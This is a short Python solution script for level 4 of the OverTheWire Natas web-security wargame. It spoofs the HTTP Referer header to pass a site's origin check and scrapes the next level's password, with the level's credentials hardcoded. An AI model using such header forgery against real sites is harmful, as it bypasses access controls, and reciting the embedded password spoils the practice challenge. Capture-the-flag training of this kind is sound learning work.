#!/usr/bin/env python3
'''
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas4.py
https://www.youtube.com/watch?v=Sf63W1xXzNU&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=3 
https://docs.python-requests.org/en/master/
 

Level 4 → Level 4
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org
password: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ 
problem: 
    Access disallowed. You are visiting from "" while authorized users
    should come only from "http://natas5.natas.labs.overthewire.org/"
         Refresh page

write up: The  idea  is to change  the  header been sand
 
'''
import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
#https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#request_context
# Referer HTTP request header contains an absolute or partial address of
# the page making the request.
headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/" }

url = 'http://%s.natas.labs.overthewire.org/' % username
print('\nURL = ',url,'\n')
response = requests.get(url, auth = (username, password), headers = headers )
content = response.text
print(content)

results =re.findall('The password for natas5 is (.*)', content)[0]
print (results)
 